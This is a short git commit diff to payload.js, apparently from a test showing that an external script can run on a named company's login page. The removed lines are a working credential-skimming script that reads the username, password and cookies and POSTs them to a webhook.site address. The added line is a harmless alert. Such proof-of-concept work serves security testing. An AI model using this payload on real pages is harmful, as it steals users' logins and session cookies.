391ed235799d5c5bd14563464f405cfa414792f9
Aryan Parashar <160344522+Aryan-Parashar@users.noreply.github.com>
2025-06-27 07:51:24 +0530

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,14 +1,1 @@
-// Simulated attacker payload
-const username = document.querySelector('input[type=text]')?.value;
-const password = document.querySelector('input[type=password]')?.value;
-
-fetch('https://webhook.site/389656c6-21f4-4d3d-a0d9-778a6799c4e0', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({
-    site: document.location.href,
-    username: username,
-    password: password,
-    cookies: document.cookie
-  })
-});
+alert("Mahindra EDI Login Page Executed External JS!");
